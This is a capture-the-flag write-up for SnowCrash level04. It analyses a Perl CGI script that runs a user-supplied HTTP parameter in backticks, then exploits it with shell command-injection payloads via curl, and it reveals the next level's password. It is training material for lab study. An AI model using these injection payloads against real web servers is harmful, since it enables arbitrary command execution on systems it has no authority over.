<h1>LEVEL04</h1>


<h4>GETTING STARTED</h4>

When `ls -la` we notice a .pl file. A `.pl` file typically refers to a script written in Perl. This is a CGI, which is a Perl module that allows Perl scripts to interact with web servers and handle HTTP requests and responses.

The script defines a subroutine x that takes a single argument. Inside this subroutine: `$y = $_[0];` assigns the first argument passed to the subroutine to the variable $y.
print `echo $y 2>&1`; uses backticks to execute the echo command with the contents of `$y` as its argument. The output of echo is then printed. `2>&1` redirects standard error (stderr) to standard output (stdout), so errors from the echo command are also printed.

`x(param("x"));` calls the `x` subroutine with the result of `param("x"`) as its argument. `param("x")` retrieves the value of the "x" parameter from the HTTP request's query string or post data. This means the script takes user input via the "x" parameter and directly passes it to a command execution context (backticks in Perl), which is a critical security issue.

This script is vulnerable to command injection attacks. Since it directly passes user-supplied data (param("x")) to the shell without any sanitization, an attacker could supply specially crafted input to execute arbitrary commands on the server. For example, if an attacker accessed `http://localhost:4747/level04.pl?x=;id`, the server would execute the id command, potentially revealing sensitive information about the server's users.

<h4>INJECTIONS</h4>

```
level04@SnowCrash:~$ strings ./level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
x(param("x"));
```


I dont have write permission so i cant change the file. It has an address and a port so its a script that is designed to execute as part of a web service, likely meant to interact with HTTP requests. For example : 

```
level04@SnowCrash:~$ curl http://localhost:4747/level04.pl?x=test
test
```

`$(command)`: This syntax is used for command substitution in shell, which executes the command and substitutes its output. Since the Perl script uses backticks to execute the contents of the x parameter, including $(getflag) within the parameter might lead the server to execute the getflag command. 

`level04@SnowCrash:~$ curl http://localhost:4747/level04.pl?x=$(getflag)` 

Make sure to include single quotes around otherwise the variable will expand before the curl gets executed resulting in running the script as the user level04 instead of flag04.

<details><summary> SOLUTION </summary>
  
* `su level05`

<p align="center">
👑 ne2searoevaevoem4ov4ar8ap 👑
</p>
                                           
</details>

